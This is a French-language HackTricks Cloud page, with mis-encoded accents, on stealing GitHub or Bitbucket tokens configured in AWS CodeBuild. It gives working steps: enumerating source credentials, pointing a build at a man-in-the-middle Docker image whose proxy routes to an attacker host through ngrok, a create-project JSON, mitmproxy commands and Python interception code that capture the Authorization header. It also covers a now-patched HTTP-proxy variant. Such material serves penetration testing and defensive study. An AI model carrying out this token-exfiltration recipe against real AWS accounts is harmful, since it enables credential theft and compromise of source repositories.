# AWS Codebuild - Fuite de jetons

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

## R√©cup√©rer les jetons configur√©s pour Github/Bitbucket

Tout d'abord, v√©rifiez s'il y a des informations d'identification source configur√©es que vous pourriez divulguer:
```bash
aws codebuild list-source-credentials
```
### Via Docker Image

Si vous d√©couvrez que l'authentification, par exemple sur Github, est configur√©e dans le compte, vous pouvez **exfiltrer** cet **acc√®s** (**jeton GH ou jeton OAuth**) en faisant en sorte que Codebuild **utilise une image Docker sp√©cifique** pour ex√©cuter la construction du projet.

Dans ce but, vous pourriez **cr√©er un nouveau projet Codebuild** ou modifier l'**environnement** d'un projet existant pour d√©finir l'**image Docker**.

L'image Docker que vous pourriez utiliser est [https://github.com/carlospolop/docker-mitm](https://github.com/carlospolop/docker-mitm). Il s'agit d'une image Docker tr√®s basique qui d√©finira les **variables d'environnement `https_proxy`**, **`http_proxy`** et **`SSL_CERT_FILE`**. Cela vous permettra d'intercepter la plupart du trafic de l'h√¥te indiqu√© dans **`https_proxy`** et **`http_proxy`** et de faire confiance au CERT SSL indiqu√© dans **`SSL_CERT_FILE`**.

1. **Cr√©ez et t√©l√©versez votre propre image Docker MitM**
* Suivez les instructions du d√©p√¥t pour d√©finir votre adresse IP de proxy et d√©finir votre certificat SSL et **construisez l'image Docker**.
* **NE D√âFINISSEZ PAS `http_proxy`** pour ne pas intercepter les demandes vers le point de terminaison de m√©tadonn√©es.
* Vous pourriez utiliser **`ngrok`** comme `ngrok tcp 4444` pour d√©finir le proxy vers votre h√¥te.
* Une fois l'image Docker construite, **t√©l√©versez-la dans un d√©p√¥t public** (Dockerhub, ECR...)
2. **D√©finissez l'environnement**
* Cr√©ez un **nouveau projet Codebuild** ou **modifiez** l'environnement d'un projet existant.
* Configurez le projet pour utiliser l'**image Docker pr√©c√©demment g√©n√©r√©e**

<figure><img src="../../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

3. **D√©finissez le proxy MitM sur votre h√¥te**

* Comme indiqu√© dans le **d√©p√¥t Github**, vous pourriez utiliser quelque chose comme:
```bash
mitmproxy --listen-port 4444  --allow-hosts "github.com"
```
{% hint style="success" %}
La version de **mitmproxy utilis√©e √©tait la 9.0.1**, il a √©t√© signal√© qu'avec la version 10 cela pourrait ne pas fonctionner.
{% endhint %}

4. **Ex√©cuter la construction & capturer les informations d'identification**

*   Vous pouvez voir le jeton dans l'en-t√™te **Authorization** :

<figure><img src="../../../../.gitbook/assets/image (273).png" alt=""><figcaption></figcaption></figure>

Cela pourrait √©galement √™tre fait depuis l'aws cli avec quelque chose comme

{% code overflow="wrap" %}
```bash
# Create project using a Github connection
aws codebuild create-project --cli-input-json file:///tmp/buildspec.json

## With /tmp/buildspec.json
{
"name": "my-demo-project",
"source": {
"type": "GITHUB",
"location": "https://github.com/uname/repo",
"buildspec": "buildspec.yml"
},
"artifacts": {
"type": "NO_ARTIFACTS"
},
"environment": {
"type": "LINUX_CONTAINER", // Use "ARM_CONTAINER" to run docker-mitm ARM
"image": "docker.io/carlospolop/docker-mitm:v12",
"computeType": "BUILD_GENERAL1_SMALL",
"imagePullCredentialsType": "CODEBUILD"
}
}

## Json

# Start the build
aws codebuild start-build --project-name my-project2
```
{% endcode %}

### ~~Via HTTP protocol~~

{% hint style="success" %}
**Cette vuln√©rabilit√© a √©t√© corrig√©e par AWS √† un moment donn√© la semaine du 20 f√©vrier 2023 (je pense le vendredi). Donc un attaquant ne peut plus en abuser :)**
{% endhint %}

Un attaquant avec des **permissions √©lev√©es sur un CodeBuild pourrait divulguer le token Github/Bitbucket** configur√© ou si les permissions √©taient configur√©es via OAuth, le **token OAuth temporaire utilis√© pour acc√©der au code**.

* Un attaquant pourrait ajouter les variables d'environnement **http\_proxy** et **https\_proxy** au projet CodeBuild pointant vers sa machine (par exemple `http://5.tcp.eu.ngrok.io:14972`).

<figure><img src="../../../../.gitbook/assets/image (232).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (213).png" alt=""><figcaption></figcaption></figure>

* Ensuite, changer l'URL du d√©p√¥t github pour utiliser HTTP au lieu de HTTPS, par exemple: \*\*http://\*\*github.com/carlospolop-forks/TestActions
* Ensuite, ex√©cuter l'exemple de base depuis [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) sur le port point√© par les variables de proxy (http\_proxy et https\_proxy)
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
* Enfin, cliquez sur **Build the project**, les **informations d'identification** seront **envoy√©es en clair** (base64) au port mitm :

<figure><img src="../../../../.gitbook/assets/image (159).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Maintenant, un attaquant pourra utiliser le jeton depuis sa machine, lister tous les privil√®ges qu'il poss√®de et les (ab)user plus facilement que d'utiliser le service CodeBuild directement.
{% endhint %}

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
